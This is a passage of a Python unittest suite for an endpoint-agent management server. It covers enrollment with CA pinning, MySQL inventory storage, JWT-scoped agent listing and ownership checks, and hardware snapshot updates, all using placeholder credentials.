            self.assertNotIn("verify", get.call_args.kwargs)

    def test_enroll_posts_with_ca_pin(self):
        from colsoft_tools.enrollment import enroll, resolve_enroll_verify

        with tempfile.TemporaryDirectory() as tmp:
            ca = os.path.join(tmp, "ca.crt")
            with open(ca, "w", encoding="utf-8") as fh:
                fh.write("placeholder")
            self.assertEqual(resolve_enroll_verify("https://h", ca), ca)
            with patch("colsoft_tools.enrollment.requests.post") as post:
                post.return_value.status_code = 200
                post.return_value.json.return_value = {
                    "agent_id": "agt_pin",
                    "client_name": "n",
                }
                enroll(
                    "https://h:8001",
                    "tok",
                    "n",
                    out_dir=tmp,
                    verify=ca,
                )
                self.assertEqual(post.call_args.kwargs.get("verify"), ca)

    def test_docker_cmd_is_python_main_not_uvicorn_cli(self):
        docker = (ROOT / "server" / "Dockerfile").read_text(encoding="utf-8")
        self.assertIn('CMD ["python", "main.py"]', docker)
        self.assertNotIn("uvicorn main:app", docker)
        self.assertIn("healthcheck.py", docker)
        enroll_script = (ROOT / "scripts" / "enroll.py").read_text(encoding="utf-8")
        self.assertIn("python main.py", enroll_script)
        self.assertNotIn("uvicorn main:app", enroll_script)

    def test_cumplimiento_doc_exists(self):
        path = ROOT / "docs" / "cumplimiento.md"
        self.assertTrue(path.is_file())
        text = path.read_text(encoding="utf-8")
        self.assertIn("ISO 27001", text)
        self.assertIn("CIS", text)
        self.assertIn("SFC", text)


class TestAgentInventory(unittest.TestCase):
    def setUp(self):
        self._env = patch.dict(
            os.environ,
            {
                "MYSQL_HOST": "127.0.0.1",
                "MYSQL_DATABASE": "robin_agents_test",
                "AGENT_STORE_URL": "sqlite:///:memory:",
            },
            clear=False,
        )
        self._env.start()
        from lib.agent_store import reset_agent_store

        reset_agent_store()

    def tearDown(self):
        from lib.agent_store import reset_agent_store

        reset_agent_store()
        self._env.stop()

    def test_mysql_host_url_and_empty_port(self):
        from lib.agent_store import _parse_mysql_host_port

        host, port = _parse_mysql_host_port("https://db.example.test/", "")
        self.assertEqual(host, "db.example.test")
        self.assertEqual(port, 3306)
        host2, port2 = _parse_mysql_host_port("127.0.0.1", "")
        self.assertEqual((host2, port2), ("127.0.0.1", 3306))
        host3, port3 = _parse_mysql_host_port("localhost", "bad")
        self.assertEqual((host3, port3), ("127.0.0.1", 3306))

    def test_mysql_credentials_from_host_url(self):
        from lib.agent_store import _mysql_connect_args, _mysql_credentials

        with patch.dict(
            os.environ,
            {
                "MYSQL_HOST": "mysql://dbuser:dbpass@db.example.test:3307/agentes",
                "MYSQL_USER": "",
                "MYSQL_PASSWORD": "",
                "MYSQL_DATABASE": "",
            },
            clear=False,
        ):
            user, password, database = _mysql_credentials()
            self.assertEqual(user, "dbuser")
            self.assertEqual(password, "dbpass")
            self.assertEqual(database, "agentes")
            args = _mysql_connect_args()
            self.assertEqual(args["host"], "db.example.test")
            self.assertEqual(args["port"], 3307)
            self.assertEqual(args["user"], "dbuser")
            self.assertEqual(args["password"], "dbpass")
            self.assertEqual(args["database"], "agentes")

    def test_mysql_disabled_skips_engine(self):
        from lib.agent_store import mysql_configured, reset_agent_store

        with patch.dict(os.environ, {"MYSQL_DISABLED": "1"}, clear=False):
            reset_agent_store()
            self.assertFalse(mysql_configured())

    def test_health_reports_mysql_inventory(self):
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent(
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            user_id="u-1",
            hostname="lab",
        )
        client = TestClient(app)
        resp = client.get("/health")
        self.assertEqual(resp.status_code, 200)
        body = resp.json()
        inv = body.get("mysql_inventory") or {}
        self.assertTrue(inv.get("configured"))
        self.assertTrue(inv.get("ready"))
        self.assertGreaterEqual(inv.get("stored_agents"), 1)
        signing = body.get("signing_key") or {}
        self.assertIn("configured", signing)
        self.assertIn("path", signing)

    def test_signing_key_reads_env_at_load_time(self):
        from connection_manager import _load_signing_key, signing_key_status
        import connection_manager as cm

        cm._signing_key_pem = None
        with tempfile.TemporaryDirectory() as tmp:
            key_path = os.path.join(tmp, "signing.key")
            with open(key_path, "w", encoding="utf-8") as f:
                f.write(
                    "-----BEGIN PRIVATE KEY-----\ntest\n-----END PRIVATE KEY-----\n"
                )
            with patch.dict(os.environ, {"SERVER_SIGNING_KEY": key_path}, clear=False):
                status = signing_key_status()
                self.assertTrue(status["configured"])
                self.assertTrue(status["readable"])
                self.assertEqual(status["path"], key_path)
                pem = _load_signing_key()
                self.assertIsNotNone(pem)
                self.assertIn("BEGIN PRIVATE KEY", pem)
            cm._signing_key_pem = None

    def test_list_agents_json_includes_inventory_fields(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent(
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            user_id="user-uuid",
            client_id="bot-1",
            hostname="sebastian-pc",
            os_name="Linux",
            ram_total_gb=16.0,
            cpu_logical_cores=8,
        )
        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "user-uuid",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-1",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.fetch_ruvic_user"
            ) as fru:
                fru.return_value = {"user_id": "user-uuid", "client_id": "bot-1"}
                ok = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            row = ok.json()[0]
            self.assertEqual(row["agent_id"], "PC_Linux_Test")
            self.assertEqual(row["hostname"], "sebastian-pc")
            self.assertEqual(row["os_name"], "Linux")
            self.assertEqual(row["ram_total_gb"], 16.0)
            self.assertEqual(row["cpu_logical_cores"], 8)
            self.assertEqual(row["user_id"], "user-uuid")
            self.assertIn("online", row)
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_ruvic_ids_from_get_payload(self):
        from lib.ruvic_user import ids_from_payload, reset_ruvic_user_cache

        reset_ruvic_user_cache()
        ids = ids_from_payload(
            {"data": {"id": "u-9", "clientId": "c-3"}},
            {"sub": "ignored", "modelBotId": "bot"},
        )
        self.assertEqual(ids["user_id"], "u-9")
        self.assertEqual(ids["client_id"], "c-3")
        fallback = ids_from_payload(None, {"sub": "user-jwt", "modelBotId": "bot-1"})
        self.assertEqual(fallback["user_id"], "user-jwt")
        self.assertEqual(fallback["client_id"], "bot-1")

    def test_owner_ids_from_jwt_ignores_logs(self):
        from lib.ruvic_user import owner_ids_from_jwt, reset_ruvic_user_cache

        reset_ruvic_user_cache()
        with patch("lib.ruvic_user.fetch_owner_from_logs") as logs:
            logs.return_value = {"user_id": "from-logs", "client_id": "from-logs-c"}
            ids = owner_ids_from_jwt(
                {"sub": "user-jwt", "modelBotId": "bot-1"}
            )
        logs.assert_not_called()
        self.assertEqual(ids["user_id"], "user-jwt")
        self.assertEqual(ids["client_id"], "bot-1")

    def test_list_agents_http_jwt_filters_owner(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent, upsert_user
        from main import app

        upsert_user("user-uuid", client_id="bot-1")
        upsert_agent(
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            user_id="user-uuid",
            client_id="bot-1",
        )
        upsert_agent(
            "PC_Windows_Test",
            client_name="PC_Windows_Test",
            user_id="user-uuid",
            client_id="bot-2",
        )
        upsert_agent(
            "PC_Other",
            client_name="PC_Other",
            user_id="other-u",
            client_id="other-bot",
        )

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "user-uuid",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-1",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.requests.get"
            ) as get:
                get.return_value.status_code = 400
                denied = client.get("/api/agents")
                self.assertEqual(denied.status_code, 401)
                ok = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            ids = [row["agent_id"] for row in ok.json()]
            self.assertEqual(sorted(ids), ["PC_Linux_Test", "PC_Windows_Test"])
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_list_agents_hides_unassigned_for_authenticated_user(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent(
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            user_id="",
            client_id="",
            hostname="lab-host",
        )
        upsert_agent(
            "PC_Other",
            client_name="PC_Other",
            user_id="other-u",
            client_id="other-bot",
        )

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "user-uuid",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-1",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.requests.get"
            ) as get, patch("connection_manager.manager.is_agent_online") as online, patch(
                "connection_manager.manager.get_connected_agents"
            ) as live:
                get.return_value.status_code = 400
                online.side_effect = lambda aid: aid == "PC_Linux_Test"
                live.return_value = [
                    {
                        "agent_id": "PC_Linux_Test",
                        "client_name": "PC_Linux_Test",
                        "remote_ip": "10.0.0.1",
                        "connected_at": "2026-09-01T12:00:00+00:00",
                    }
                ]
                ok = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            self.assertEqual(ok.json(), [])
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_list_agents_scoped_to_jwt_sub(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent("Agent_A", user_id="uuid-a", client_id="bot-a")
        upsert_agent("Agent_B", user_id="uuid-b", client_id="bot-b")

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token_a = pyjwt.encode(
            {
                "sub": "uuid-a",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-a",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        token_b = pyjwt.encode(
            {
                "sub": "uuid-b",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-b",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.fetch_ruvic_user"
            ) as fru:
                fru.return_value = {"user_id": "", "client_id": ""}
                resp_a = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token_a}"},
                )
                resp_b = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token_b}"},
                )
            self.assertEqual(resp_a.status_code, 200)
            self.assertEqual(resp_b.status_code, 200)
            ids_a = {row["agent_id"] for row in resp_a.json()}
            ids_b = {row["agent_id"] for row in resp_b.json()}
            self.assertEqual(ids_a, {"Agent_A"})
            self.assertEqual(ids_b, {"Agent_B"})
            self.assertFalse(ids_a & ids_b)
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_list_agents_empty_when_no_sub(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent("Agent_A", user_id="uuid-a", client_id="bot-a")
        upsert_agent("Agent_B", user_id="uuid-b", client_id="bot-b")

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "",
                "exp": now + timedelta(hours=1),
                "modelBotId": "",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.fetch_ruvic_user"
            ) as fru:
                fru.return_value = {"user_id": "", "client_id": ""}
                ok = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            self.assertEqual(ok.json(), [])
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_user_id_candidates_excludes_generic_logs_owner(self):
        from lib.ruvic_user import user_id_candidates_for_jwt

        with patch("lib.ruvic_user.fetch_owner_from_logs") as logs:
            logs.return_value = {"user_id": "shared-api-key-owner", "client_id": ""}
            out = user_id_candidates_for_jwt(
                {"sub": "uuid-a", "_access_token": "tok"},
                {"user_id": "uuid-a", "client_id": "bot-a"},
            )
        logs.assert_not_called()
        self.assertEqual(out, ["uuid-a"])

    def test_query_user_id_must_match_jwt_sub(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent("Agent_A", user_id="uuid-a", client_id="bot-a")
        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "uuid-a",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-a",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.fetch_ruvic_user"
            ) as fru:
                fru.return_value = {"user_id": "uuid-a", "client_id": "bot-a"}
                ok = client.get(
                    "/api/agents",
                    params={"user_id": "uuid-a"},
                    headers={"Authorization": f"Bearer {token}"},
                )
                bad = client.get(
                    "/api/agents",
                    params={"user_id": "other-user"},
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            self.assertEqual(bad.status_code, 403)
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_owner_ids_from_user_prefers_mysql_over_logs(self):
        from lib.agent_store import upsert_agent
        from lib.ruvic_user import owner_ids_from_user, reset_ruvic_user_cache

        reset_ruvic_user_cache()
        upsert_agent(
            "agt_pc_lab_abc123",
            client_name="PC_Lab",
            user_id="enroll-user-uuid",
            client_id="bot-enroll",
        )
        with patch("lib.ruvic_user.fetch_owner_from_logs") as logs:
            logs.return_value = {"user_id": "wrong-from-logs", "client_id": "wrong-bot"}
            ids = owner_ids_from_user(None, agent_id="agt_pc_lab_abc123")
        logs.assert_not_called()
        self.assertEqual(ids["user_id"], "enroll-user-uuid")
        self.assertEqual(ids["client_id"], "bot-enroll")

    def test_fetch_owner_from_logs_skips_generic_fallback_with_agent_id(self):
        from lib.ruvic_user import fetch_owner_from_logs, reset_ruvic_user_cache

        reset_ruvic_user_cache()
        with patch("lib.metrics_logger.fetch_logs") as fl:
            fl.return_value = {
                "data": [
                    {
                        "userId": "logger-api-owner",
                        "metadata": {"data": {"agent_id": "other-agent"}},
                    }
                ]
            }
            profile = fetch_owner_from_logs("PC_Linux_Test")
        self.assertEqual(profile["user_id"], "")

    def test_fetch_owner_from_logs_does_not_cache_empty_profile(self):
        from lib.ruvic_user import (
            clear_owner_logs_cache,
            fetch_owner_from_logs,
            reset_ruvic_user_cache,
        )

        reset_ruvic_user_cache()
        with patch("lib.metrics_logger.fetch_logs") as fl:
            fl.return_value = {
                "data": [{"metadata": {"data": {"agent_id": "other-agent"}}}]
            }
            first = fetch_owner_from_logs("PC_Linux_Test")
            self.assertEqual(first["user_id"], "")
            fl.return_value = {
                "data": [
                    {
                        "userId": "user-uuid",
                        "metadata": {"data": {"agent_id": "PC_Linux_Test"}},
                    }
                ]
            }
            clear_owner_logs_cache("PC_Linux_Test")
            second = fetch_owner_from_logs("PC_Linux_Test")
        self.assertEqual(second["user_id"], "user-uuid")

    def test_resolve_ws_agent_id_remaps_legacy_config_to_enroll(self):
        from controllers import _resolve_ws_agent_id
        from lib.agent_store import upsert_agent

        upsert_agent(
            "agt_pc_linux_test_a1b2c3",
            client_name="PC_Linux_Test",
            user_id="user-uuid",
            client_id="bot-1",
        )
        resolved = _resolve_ws_agent_id("PC_Linux_Test", "PC_Linux_Test")
        self.assertEqual(resolved, "agt_pc_linux_test_a1b2c3")

    def test_list_agents_matches_auth_me_id_when_sub_differs(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from lib.agent_store import upsert_agent
        from main import app

        upsert_agent(
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            user_id="internal-user-id",
            client_id="bot-1",
            hostname="lab-host",
        )

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "jwt-sub-uuid",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-1",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.ruvic_user.fetch_ruvic_user"
            ) as fru:
                fru.return_value = {
                    "user_id": "internal-user-id",
                    "client_id": "bot-1",
                }
                ok = client.get(
                    "/api/agents",
                    headers={"Authorization": f"Bearer {token}"},
                )
            self.assertEqual(ok.status_code, 200)
            ids = [row["agent_id"] for row in ok.json()]
            self.assertEqual(ids, ["PC_Linux_Test"])
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_execute_so_logs_requires_online_agent(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from main import app

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "user-uuid",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-1",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        prev = os.environ.get("ROBIN_JWT_REQUIRED")
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        client = TestClient(app)
        try:
            with patch("lib.jwt_auth.get_public_key", return_value=pub), patch(
                "lib.jwt_auth.jwt_can_issue_command", return_value=True
            ):
                resp = client.post(
                    "/api/agents/PC_Linux_Test/execute",
                    headers={"Authorization": f"Bearer {token}"},
                    json={
                        "tool": "linux_syslog",
                        "params": {
                            "source": "system",
                            "date": "2026-08-27",
                            "startHour": "14",
                            "endHour": "15",
                        },
                        "timeout": 60,
                    },
                )
            self.assertEqual(resp.status_code, 409)
            self.assertIn("offline", resp.json()["detail"].lower())
        finally:
            if prev is None:
                os.environ.pop("ROBIN_JWT_REQUIRED", None)
            else:
                os.environ["ROBIN_JWT_REQUIRED"] = prev

    def test_fetch_ruvic_user_calls_get(self):
        from lib.ruvic_user import fetch_ruvic_user, reset_ruvic_user_cache

        reset_ruvic_user_cache()
        payload = {"user": {"userId": "42", "idCliente": "7"}}
        with patch("lib.ruvic_user.requests.get") as get:
            get.return_value.status_code = 200
            get.return_value.json.return_value = payload
            ids = fetch_ruvic_user("tok", jwt_claims={"sub": "x"})
        self.assertEqual(ids["user_id"], "42")
        self.assertEqual(ids["client_id"], "7")
        self.assertIn("/auth/me", get.call_args.args[0])
        self.assertEqual(
            get.call_args.kwargs["headers"]["Authorization"], "Bearer tok"
        )

    def test_owner_from_logs_userId(self):
        from lib.ruvic_user import (
            owner_ids_from_user,
            profile_from_log,
            reset_ruvic_user_cache,
        )

        reset_ruvic_user_cache()
        log = {
            "_id": "u-from-_id",
            "id": "log-objectid",
            "userId": "u-ruvic",
            "agentId": "bot-uuid",
            "metadata": {
                "type": "activity",
                "category": "system",
                "subcategory": "agent_connected",
                "data": {"agent_id": "PC_Linux_Test", "status": "online"},
            },
        }
        prof = profile_from_log(log)
        self.assertEqual(prof["user_id"], "u-ruvic")
        self.assertEqual(prof["client_id"], "bot-uuid")
        with patch("lib.metrics_logger.fetch_logs") as fl:
            fl.return_value = {"success": True, "data": [log], "pagination": {}}
            ids = owner_ids_from_user(None, agent_id="PC_Linux_Test")
        self.assertEqual(ids["user_id"], "u-ruvic")
        self.assertEqual(ids["client_id"], "bot-uuid")

    def test_upsert_keeps_owner_and_lists_by_client(self):
        from lib.agent_store import get_agent, list_agents, upsert_agent, upsert_user

        upsert_user("u1", client_id="c1")
        first = upsert_agent(
            "agt_win",
            client_name="PC_Windows_Test",
            user_id="u1",
            client_id="c1",
            hostname="PC_Windows_Test",
        )
        self.assertEqual(first["user_id"], "u1")
        again = upsert_agent("agt_win", client_name="PC_Windows_Test")
        self.assertEqual(again["user_id"], "u1")
        self.assertEqual(again["client_id"], "c1")
        row = get_agent("agt_win")
        self.assertEqual(row["hostname"], "PC_Windows_Test")
        self.assertEqual(row["user_id"], "u1")
        only = list_agents(client_id="c1")
        self.assertEqual(len(only), 1)
        self.assertEqual(list_agents(client_id="other"), [])

    def test_hardware_snapshot_updates_same_row(self):
        from lib.agent_store import (
            apply_tool_snapshot,
            get_agent,
            list_agents,
            needs_static_inventory,
            snapshot_from_hardware,
            upsert_agent,
        )

        snap = snapshot_from_hardware(
            {
                "hostname": "PC_Linux_Test",
                "os": "Linux",
                "os_version": "6.8.0",
                "arch": "x86_64",
                "cpu": {
                    "model": "Ryzen 7",
                    "logical_cores": 16,
                    "physical_cores": 8,
                    "freq": {"max_mhz": 4200},
                },
                "memory": {"total": 16 * 1024 ** 3},
                "disks": [
                    {"device": "/dev/sda", "total": 500 * 1024 ** 3},
                    {"device": "/dev/sda", "mountpoint": "/", "total": 500 * 1024 ** 3},
                ],
                "firmware": {
                    "vendor": "Dell",
                    "product": "OptiPlex",
                    "serial": "ABC123",
                    "uuid": "uuid-1",
                },
            }
        )
        self.assertEqual(snap["ram_total_gb"], 16.0)
        self.assertEqual(snap["disk_total_gb"], 500.0)
        self.assertEqual(snap["os_name"], "Linux")
        self.assertEqual(snap["cpu_model"], "Ryzen 7")
        self.assertEqual(snap["firmware_serial"], "ABC123")
        self.assertEqual(snap["firmware_uuid"], "uuid-1")

        upsert_agent("agt_lin", client_name="PC_Linux_Test")
        self.assertTrue(needs_static_inventory("agt_lin"))
        apply_tool_snapshot("agt_lin", "hardware_inventory", {
            "hostname": "PC_Linux_Test",
            "os": "Linux",
            "memory": {"total": 8 * 1024 ** 3},
            "cpu": {"model": "i5"},
        })
        row = get_agent("agt_lin")
        self.assertEqual(row["ram_total_gb"], 8.0)
        self.assertEqual(row["cpu_model"], "i5")
        captured = row["inventory_captured_at"]
        self.assertTrue(captured)
        self.assertTrue(needs_static_inventory("agt_lin"))

        apply_tool_snapshot("agt_lin", "hardware_inventory", {
            "os": "Linux",
            "memory": {"total": 32 * 1024 ** 3},
            "cpu": {"model": "i7"},
        })
        again = get_agent("agt_lin")
        self.assertEqual(again["os_name"], "Linux")
        self.assertEqual(again["ram_total_gb"], 32.0)
        self.assertEqual(again["cpu_model"], "i7")
        self.assertGreaterEqual(again["inventory_captured_at"], captured)
        self.assertEqual(len(list_agents()), 1)

        apply_tool_snapshot("agt_lin", "health_check", {"version": "1.2.3"})
        self.assertEqual(get_agent("agt_lin")["agent_version"], "1.2.3")

    def test_static_schema_matches_orm_and_api(self):
        from lib.agent_store import (
            Agent,
            User,
            _AGENT_COLUMNS,
            _NUM_KEYS,
            _STR_KEYS,
            _USER_COLUMNS,
            snapshot_from_hardware,
        )
        from models import AgentInfo

        orm_agents = {c.name for c in Agent.__table__.columns}
        orm_users = {c.name for c in User.__table__.columns}
        self.assertEqual(set(_AGENT_COLUMNS), orm_agents)
        self.assertEqual(set(_USER_COLUMNS), orm_users)
        self.assertEqual(
            set(_STR_KEYS) | set(_NUM_KEYS) | {"agent_id", "first_seen", "last_seen"},
            orm_agents,
        )
        api = set(AgentInfo.model_fields)
        self.assertTrue(orm_agents <= api)
        snap = snapshot_from_hardware(
            {
                "hostname": "h",
                "os": "Linux",
                "os_version": "1",
                "arch": "x86_64",
                "cpu": {"model": "m", "logical_cores": "4", "freq": {"max_mhz": "3200"}},
                "memory": {"total": 1024 ** 3},
                "firmware": {"vendor": "v", "product": "p", "serial": "s", "uuid": "u"},
            }
        )
        self.assertTrue(set(snap) <= set(_STR_KEYS) | set(_NUM_KEYS))
        self.assertEqual(snap["cpu_logical_cores"], 4)
        self.assertEqual(snap["cpu_freq_mhz"], 3200.0)

    def test_profile_from_payload_ids(self):
        from lib.ruvic_user import profile_from_payload

        prof = profile_from_payload(
            {"data": {"id": "u-9", "clientId": "c-3"}},
            None,
        )
        self.assertEqual(prof["user_id"], "u-9")
        self.assertEqual(prof["client_id"], "c-3")
        self.assertNotIn("email", prof)


if __name__ == "__main__":
    unittest.main()
